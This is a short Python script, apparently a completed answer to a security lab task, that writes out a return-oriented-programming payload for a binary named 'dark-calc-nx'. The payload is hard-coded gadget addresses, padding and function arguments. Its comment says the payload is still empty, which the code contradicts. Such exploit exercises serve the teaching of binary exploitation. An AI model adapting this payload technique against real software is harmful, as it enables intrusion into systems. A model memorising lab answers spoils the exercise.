#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\x78\x19\x40\x00\x00\x00\x00\x00"
payload += b"A" * 16

payload += b"\x34\x1a\x40\x00\x00\x00\x00\x00"

payload += b"\x2a\x1a\x40\x00\x00\x00\x00\x00"

payload += b"\x00" * 8
payload += b"\x01\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x90\x20\x60\x00\x00\x00\x00\x00"
payload += b"\x04\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x00" * 16

payload += b"\x10\x1a\x40\x00\x00\x00\x00\x00"

payload += b"\x00" * 56

payload += b"\x60\x16\x40\x00\x00\x00\x00\x00"


sys.stdout.buffer.write(payload)
